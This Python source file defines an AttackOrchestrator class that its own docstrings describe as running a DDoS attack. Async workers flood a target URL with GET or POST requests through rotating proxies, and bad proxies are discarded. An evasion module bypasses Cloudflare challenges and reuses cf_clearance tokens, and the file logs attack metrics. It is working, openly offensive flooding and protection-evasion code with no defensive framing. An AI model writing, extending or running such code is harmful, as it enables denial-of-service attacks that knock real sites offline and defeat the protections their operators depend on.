import asyncio
import time
from typing import Dict, Any, List, Tuple
import aiohttp

from .request_builder import RequestBuilder
from .evasion_module import EvasionModule
from .proxy_manager import ProxyManager
from .utils import log_attack_metrics

class AttackOrchestrator:
    """
    Coordinates the entire DDoS attack, managing workers, rate limiting,
    and adaptive strategies.
    """
    def __init__(self, target_url: str, method: str, rate: int, workers: int,
                 proxy_manager: ProxyManager, duration: int = 0,
                 post_data: str = None, custom_headers: str = None,
                 user_agent_file: str = None, challenge_solver_mode: str = "headless_browser"):
        self.target_url = target_url
        self.method = method
        self.rate_per_worker = rate // workers if workers > 0 else rate
        self.num_workers = workers
        self.proxy_manager = proxy_manager
        self.attack_duration = duration
        self.post_data_template = post_data
        self.custom_headers_file = custom_headers
        self.user_agent_file = user_agent_file
        self.challenge_solver_mode = challenge_solver_mode

        self.request_builder = RequestBuilder(self.target_url, self.method,
                                              user_agent_file=self.user_agent_file,
                                              custom_headers_file=self.custom_headers_file,
                                              post_data_templates_file="post_data_templates.json")
        self.evasion_module = EvasionModule(challenge_solver_mode=self.challenge_solver_mode)

        self.start_time = 0.0
        self.total_requests_sent = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.challenge_bypasses = 0
        self.attack_active = False

    async def _worker_task(self, worker_id: int):
        """
        Individual worker task that continuously sends requests.
        """
        print(f"Worker {worker_id} started.")
        session_cookies: Dict[str, str] = {}
        cf_clearance_token: str | None = None
        current_proxy: Dict[str, Any] | None = None
        proxy_retries = 0
        MAX_PROXY_RETRIES = 3

        while self.attack_active and (self.attack_duration == 0 or (time.time() - self.start_time) < self.attack_duration):
            try:
                if not current_proxy:
                    current_proxy = await self.proxy_manager.get_random_proxy()
                    if not current_proxy:
                        print(f"Worker {worker_id}: No active proxies, waiting...")
                        await asyncio.sleep(5)
                        continue

                request_config = await self.request_builder.build_request(session_cookies, cf_clearance_token)
                
                async with aiohttp.ClientSession() as session:
                    proxy_url = current_proxy["url"]
                    
                    if self.method == "GET":
                        response = await session.get(request_config["url"],
                                                     headers=request_config["headers"],
                                                     proxy=proxy_url,
                                                     timeout=10,
                                                     allow_redirects=False)
                    elif self.method == "POST":
                        response = await session.post(request_config["url"],
                                                      headers=request_config["headers"],
                                                      data=request_config["data"],
                                                      proxy=proxy_url,
                                                      timeout=10,
                                                      allow_redirects=False)
                    else:
                        print(f"Worker {worker_id}: Unsupported method {self.method}")
                        self.failed_requests += 1
                        await asyncio.sleep(1 / self.rate_per_worker)
                        continue

                    self.total_requests_sent += 1

                    for cookie in response.cookies:
                        session_cookies[cookie.key] = cookie.value

                    if response.status == 200:
                        self.successful_requests += 1
                        proxy_retries = 0
                    elif response.status in [403, 503] or "Cloudflare" in (await response.text()):
                        print(f"Worker {worker_id}: Cloudflare challenge/block detected ({response.status}) for {request_config['url']}. Attempting bypass...")
                        
                        new_cookies, new_cf_clearance = await self.evasion_module.handle_response_for_challenge(
                            await response.text(), request_config["url"], current_proxy["raw"]
                        )
                        
                        if new_cf_clearance:
                            session_cookies.update(new_cookies)
                            cf_clearance_token = new_cf_clearance
                            self.challenge_bypasses += 1
                            print(f"Worker {worker_id}: Challenge bypassed. New CF_Clearance: {cf_clearance_token}")
                            proxy_retries = 0
                        else:
                            print(f"Worker {worker_id}: Failed to bypass challenge with proxy {current_proxy['raw']}.")
                            self.failed_requests += 1
                            proxy_retries += 1
                            if proxy_retries >= MAX_PROXY_RETRIES:
                                print(f"Worker {worker_id}: Max retries reached for proxy {current_proxy['raw']}. Removing bad proxy.")
                                await self.proxy_manager.remove_bad_proxy(current_proxy)
                                current_proxy = None
                                proxy_retries = 0
                    else:
                        print(f"Worker {worker_id}: Request failed with status {response.status} for {request_config['url']}")
                        self.failed_requests += 1
                        proxy_retries += 1
                        if proxy_retries >= MAX_PROXY_RETRIES:
                            print(f"Worker {worker_id}: Max retries reached for proxy {current_proxy['raw']}. Removing bad proxy.")
                            await self.proxy_manager.remove_bad_proxy(current_proxy)
                            current_proxy = None
                            proxy_retries = 0

                await asyncio.sleep(1 / self.rate_per_worker)
            
            except aiohttp.ClientError as e:
                print(f"Worker {worker_id}: Network error or connection issue with proxy {current_proxy['raw']}: {e}")
                self.failed_requests += 1
                proxy_retries += 1
                if proxy_retries >= MAX_PROXY_RETRIES:
                    print(f"Worker {worker_id}: Max retries reached for proxy {current_proxy['raw']}. Removing bad proxy.")
                    await self.proxy_manager.remove_bad_proxy(current_proxy)
                    current_proxy = None
                    proxy_retries = 0
                await asyncio.sleep(1 / self.rate_per_worker)
            except Exception as e:
                print(f"Worker {worker_id}: An unexpected error occurred: {e}")
                self.failed_requests += 1
                await asyncio.sleep(1 / self.rate_per_worker)

    async def start_attack(self):
        """
        Initiates the DDoS attack by spawning worker tasks.
        """
        print(f"Starting DDoS attack with {self.num_workers} workers...")
        self.attack_active = True
        self.start_time = time.time()

        workers_tasks = [self._worker_task(i) for i in range(self.num_workers)]
        
        await asyncio.gather(*workers_tasks)
        
        self.attack_active = False
        print("DDoS attack finished.")
        self.proxy_manager.stop()
        log_attack_metrics(self.total_requests_sent, self.successful_requests,
                           self.failed_requests, self.challenge_bypasses,
                           time.time() - self.start_time)

    def stop_attack(self):
        """Stops the ongoing DDoS attack."""
        self.attack_active = False
        print("Stopping attack.")
